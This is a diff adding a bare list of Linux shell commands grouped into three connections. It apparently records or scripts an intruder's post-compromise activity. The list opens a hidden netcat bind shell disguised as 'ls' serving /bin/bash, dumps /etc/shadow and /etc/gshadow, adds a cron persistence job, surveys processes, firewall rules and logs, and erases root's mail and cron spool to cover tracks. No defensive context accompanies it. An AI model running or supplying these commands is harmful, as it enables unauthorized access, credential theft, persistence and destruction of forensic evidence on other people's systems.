@@ -1,0 +1,33 @@
+1st connection with tty
+
+ps -ef --forest
+ for i in /proc/[0-9]*;do [ -e "$i/exe" ] && printf '%5s : %s\n' "${i//*\/}" "`tr '\0' \ <$i/cmdline`";done
+ ps -ef --sort start_time
+ netstat -tupan
+ nohup ./ls -nlvp 54137 -e /bin/bash &
+ ls -lat /bin; ls -lat /sbin; ls -lat /usr/bin; ls -lat /usr/sbin; ls -lat /usr/local/bin; ls -lat /usr/local/sbin
+ hostname
+ vi
+ w
+cat /etc/passwd
+cat /etc/shadow
+cat /etc/group
+cat /etc/gshadow
+
+2nd connection with nc
+(crontab -l 2>/dev/null; echo "*/20 * * * * scp") | crontab -
+crontab -l 
+systemctl list-units --type service --all
+iptables -L -n -v
+cat ~/.bash_history
+cat /etc/rsyslog.conf
+last
+ls -lat /etc/init
+
+3rd connection with ssh  
+ls -lat /var/spool/cron
+cat /var/spool/cron/root
+> /var/spool/mail/root
+cat /var/spool/cron/root
+> /var/spool/cron/root
+ls -lat /var/spool/cron
